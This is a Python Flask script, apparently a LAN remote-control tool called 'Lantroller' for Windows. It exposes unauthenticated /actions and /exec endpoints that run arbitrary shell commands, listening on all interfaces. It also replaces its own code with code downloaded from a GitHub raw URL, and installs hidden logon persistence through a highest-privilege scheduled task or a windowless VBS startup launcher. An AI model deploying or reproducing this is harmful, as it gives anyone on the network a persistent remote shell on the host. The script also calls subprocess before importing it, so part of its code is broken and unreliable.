import os
import sys
import tempfile
import random
import string
try:
    import requests
except ImportError:
    # Ensure 'requests' is available in the current interpreter environment
    subprocess.run([sys.executable, "-m", "pip", "install", "requests"])  # best-effort
    import requests
import subprocess
import threading
import time
import ctypes
import shutil
from flask import Flask, send_file, request, jsonify, Response, stream_with_context
import socket
import locale

try:
    from zeroconf import Zeroconf, ServiceInfo
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "zeroconf"])
    from zeroconf import Zeroconf, ServiceInfo

# ===== CONFIG =====
PYTHON_UPDATE_URL = "https://raw.githubusercontent.com/KRWCLASSIC/Lantroller/refs/heads/main/server.py"
HTML_UPDATE_URL = "https://raw.githubusercontent.com/KRWCLASSIC/Lantroller/refs/heads/main/ui.html"
HOSTNAME = "controlled.local"
PORT = 5000
# ==================

app = Flask(__name__)
temp_html_path = None

def _file_exists(path: str) -> bool:
    try:
        return path and os.path.exists(path)
    except Exception:
        return False

def resolve_python_invocation(script_path: str):
    """Return (exe, args_list) choosing a robust Python runtime.

    Prefers 'py -3' on Windows, then sys.executable if it exists,
    then 'python3' or 'python' from PATH.
    args_list always includes the executable/program name as argv[0].
    """
    # 1) Prefer 'python' from PATH to match how user ran `python server.py`
    found = shutil.which('python')
    if found:
        return (found, [found, script_path])

    # 2) Next try 'python3' on PATH
    found = shutil.which('python3')
    if found:
        return (found, [found, script_path])

    # 3) Fallback to the current interpreter if it exists
    if _file_exists(sys.executable):
        return (sys.executable, [sys.executable, script_path])

    # 4) Last resort: use bare 'python' and rely on PATH
    return ('python', ['python', script_path])

def quote_arg(arg: str) -> str:
    if not arg:
        return '""'
    if ' ' in arg or '"' in arg or '\\' in arg:
        # naive safe quoting for Task Scheduler command line
        return '"' + arg.replace('"', '\\"') + '"'
    return arg

def resolve_pythonw_invocation(script_path: str):
    """Return (exe, args_list) prioritizing a windowless Python (pythonw) on Windows.

    Order:
      1) 'pythonw' from PATH
      2) sibling pythonw.exe next to PATH 'python'
      3) sibling pythonw.exe next to sys.executable
      4) bare 'pythonw' (hope PATH resolves)
      5) fallback to resolve_python_invocation
    """
    # 1) PATH 'pythonw'
    found_w = shutil.which('pythonw')
    if found_w:
        return (found_w, [found_w, script_path])

    # 2) Sibling next to PATH 'python'
    found_py = shutil.which('python')
    if found_py:
        candidate = os.path.join(os.path.dirname(found_py), 'pythonw.exe')
        if _file_exists(candidate):
            return (candidate, [candidate, script_path])

    # 3) Sibling next to sys.executable
    if _file_exists(sys.executable):
        candidate = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
        if _file_exists(candidate):
            return (candidate, [candidate, script_path])

    # 4) Bare 'pythonw'
    return ('pythonw', ['pythonw', script_path])

def launch_with_path_python_and_exit(extra_args=None):
    """Launch the script using the in-PATH `python` and terminate current process.

    Uses subprocess with an arg list to avoid quoting issues. Falls back to bare
    'python' if not resolvable via which.
    """
    if extra_args is None:
        extra_args = []
    python_cmd = shutil.which('python') or 'python'
    script_path = os.path.realpath(sys.argv[0])
    cmd = [python_cmd, script_path] + list(extra_args)
    try:
        subprocess.Popen(cmd, close_fds=True)
    finally:
        os._exit(0)

def fetch_ui():
    global temp_html_path
    try:
        r = requests.get(HTML_UPDATE_URL, timeout=5)
        r.raise_for_status()
        temp_name = "ui_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) + ".html"
        temp_html_path = os.path.join(tempfile.gettempdir(), temp_name)
        with open(temp_html_path, "w", encoding="utf-8") as f:
            f.write(r.text)
        print(f"[INFO] UI fetched to {temp_html_path}")
    except Exception as e:
        print(f"[ERROR] Failed to fetch UI: {e}")

def update_self():
    try:
        r = requests.get(PYTHON_UPDATE_URL, timeout=5)
        r.raise_for_status()
        script_path = os.path.realpath(sys.argv[0])
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(r.text)
        print("[INFO] Backend updated, restarting...")
        # Relaunch using in-PATH python
        launch_with_path_python_and_exit(sys.argv[1:])
    except Exception as e:
        return f"Update failed: {e}"

@app.route("/ui")
def serve_ui():
    if temp_html_path and os.path.exists(temp_html_path):
        return send_file(temp_html_path)
    return "UI not fetched", 500

@app.route("/actions")
def actions():
    cmd = request.args.get("cmd")
    if not cmd:
        return jsonify({"error": "No command provided"}), 400
    try:
        subprocess.Popen(cmd, shell=True)
        return jsonify({"status": f"Executed: {cmd}"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.post("/exec")
def exec_stream():
    data = request.get_json(silent=True) or {}
    cmd = data.get("cmd")
    if not cmd:
        return jsonify({"error": "No command provided"}), 400

    def generate():
        try:
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
            preferred = 'utf-8'
            try:
                preferred = locale.getpreferredencoding(False) or 'utf-8'
            except Exception:
                preferred = 'utf-8'
            for chunk in iter(lambda: process.stdout.read(4096), b''):
                try:
                    text = chunk.decode(preferred, errors='replace')
                except Exception:
                    text = chunk.decode('utf-8', errors='replace')
                yield text
            if process.stdout:
                process.stdout.close()
            return_code = process.wait()
            yield f"\n[Process exited with code {return_code}]\n"
        except Exception as e:
            yield f"ERROR: {str(e)}\n"

    return Response(stream_with_context(generate()), mimetype="text/plain")

@app.get("/health")
def health():
    return jsonify({"ok": True})

@app.route("/refetch-ui")
def refetch_ui():
    fetch_ui()
    return jsonify({"status": "UI refetched"})

@app.route("/update")
def update():
    threading.Thread(target=update_self).start()
    return jsonify({"status": "Updating backend..."})

@app.route("/restart")
def restart():
    def _restart():
        time.sleep(1)
        try:
            launch_with_path_python_and_exit(sys.argv[1:])
        except Exception as e:
            print(f"[ERROR] Restart failed: {e}")
    threading.Thread(target=_restart).start()
    return jsonify({"status": "Restarting server..."})

def install_startup():
    """Install app to run on logon with highest privileges via Scheduled Task.

    Attempts to create a Windows Scheduled Task with RunLevel=Highest.
    If elevation is declined, falls back to a Startup folder .bat.
    """
    script_path = os.path.realpath(sys.argv[0])
    task_name = "Lantroller"

    # Prepare elevated calls to schtasks using windowless pythonw
    pythonw_exe, argv = resolve_pythonw_invocation(script_path)
    cmd_line = ' '.join(quote_arg(a) for a in argv)
    schtasks_delete_args = f'/Delete /TN {quote_arg(task_name)} /F'
    schtasks_create_args = f'/Create /TN {quote_arg(task_name)} /TR {quote_arg(cmd_line)} /SC ONLOGON /RL HIGHEST /F'

    try:
        # First, try to delete any existing task (ignore failures)
        ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",
            "schtasks.exe",
            schtasks_delete_args,
            None,
            1,
        )
        # Then create the task elevated
        rc = ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",
            "schtasks.exe",
            schtasks_create_args,
            None,
            1,
        )
        if rc <= 32:
            raise RuntimeError(f"ShellExecuteW failed with code {rc}")
        print(f"[INFO] Requested creation of elevated scheduled task '{task_name}'.")
        print("[INFO] If you accepted the UAC prompt, the task will run with highest privileges on logon.")
        return
    except Exception as e:
        print(f"[WARN] Could not create elevated scheduled task (maybe UAC declined): {e}")
        print("[WARN] Falling back to per-user Startup shortcut (not elevated).")

    # Fallback: non-elevated Startup folder launcher (VBS + pythonw to avoid console window)
    startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    os.makedirs(startup_dir, exist_ok=True)
    vbs_path = os.path.join(startup_dir, os.path.basename(sys.argv[0]).replace(".py", ".vbs"))
    pythonw_path = pythonw_exe if _file_exists(pythonw_exe) else (shutil.which('pythonw') or 'pythonw')
    cmd_str = f'{quote_arg(pythonw_path)} {quote_arg(script_path)}'
    vbs = (
        'Set WshShell = CreateObject("WScript.Shell")\n'
        f'WshShell.Run {quote_arg(cmd_str)}, 0\n'
    )
    with open(vbs_path, "w", encoding="utf-8") as f:
        f.write(vbs)
    print(f"[INFO] Installed non-elevated startup launcher: {vbs_path}")

def register_mdns():
    zeroconf = Zeroconf()
    ip_bytes = socket.inet_aton(socket.gethostbyname(socket.gethostname()))
    info = ServiceInfo(
        "_http._tcp.local.",
        f"{HOSTNAME}._http._tcp.local.",
        addresses=[ip_bytes],
        port=PORT,
        properties={},
        server=f"{HOSTNAME}."
    )
    zeroconf.register_service(info)
    print(f"[INFO] mDNS registered as {HOSTNAME}:{PORT}")

if __name__ == "__main__":
    if "--install" in sys.argv:
        install_startup()
        sys.exit(0)
    fetch_ui()
    threading.Thread(target=register_mdns, daemon=True).start()
    app.run(host="0.0.0.0", port=PORT)
